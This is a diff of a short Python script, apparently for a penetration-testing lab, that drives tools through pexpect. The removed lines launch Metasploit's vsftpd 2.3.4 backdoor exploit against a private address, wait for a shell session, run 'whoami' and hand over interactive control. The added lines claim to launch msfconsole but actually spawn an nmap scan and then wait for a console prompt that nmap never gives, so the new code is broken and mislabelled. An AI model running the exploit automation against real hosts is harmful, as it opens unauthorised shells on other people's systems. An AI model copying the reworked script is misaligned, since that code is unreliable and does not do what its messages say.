@@ -1,33 +1,42 @@
 import pexpect
+import time
+import sys
+import re
 
-def run_msf_exploit():
-    # Define the command to run in msfconsole
-    msf_command = """msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.18.129; set RPORT 21; exploit" """
+def interact_with_msfconsole():
+    # Start msfconsole
+    print("Launching msfconsole. Please wait...")
+    child = pexpect.spawn('nmap -sV 192.168.18.129', encoding='utf8', timeout=120)
     
-    # Start the msfconsole command with pexpect
-    child = pexpect.spawn(msf_command, encoding='utf-8', timeout=None)  # Using None for timeout waits indefinitely
-    
-    # Pattern to detect when the command shell session is opened
-    session_opened_pattern = r'Command shell session \d+ opened'
+    # Enable logging to stdout for debugging
+    child.logfile = sys.stdout
+
+    # Wait for a bit to allow all startup messages to be printed
+    # This time might need adjustment based on your system's performance and msfconsole's behavior
+    time.sleep(10)
+
+    # Attempt to match the prompt. Adjust this pattern if your msfconsole uses a different prompt.
+    prompt_pattern = re.compile(r'.*>\s*$', re.MULTILINE)
     
     try:
-        # Wait for the session opened message
-        child.expect(session_opened_pattern, timeout=300)  # Adjust timeout as necessary
-        print("Shell session opened successfully.")
-        
-        # You can add more interactions here, e.g., sending commands to the shell
-        child.sendline('whoami')
-        
-        # Hand over control to the user for manual interaction
-        print("Switching to manual interaction...")
-        child.interact()
-        
+        # Now attempt to match the prompt
+        child.expect(prompt_pattern, timeout=30)
+        print("\nmsfconsole prompt detected. Ready for command execution.")
+
+        # Example command execution: 'version'
+        child.sendline('version')
+        child.expect(prompt_pattern, timeout=30)
+        print("\nExecuted 'version' command. Output above.")
+
+        # Properly exit msfconsole
+        child.sendline('exit')
+        child.expect(pexpect.EOF)
+
     except pexpect.TIMEOUT:
-        print("Timeout waiting for the shell session to open.")
+        print("Failed to detect msfconsole prompt. Please check the startup sequence and adjust the script.")
+
     except pexpect.EOF:
-        print("Metasploit console closed.")
-    except Exception as e:
-        print(f"An error occurred: {e}")
+        print("msfconsole closed unexpectedly.")
 
 if __name__ == "__main__":
-    run_msf_exploit()
+    interact_with_msfconsole()
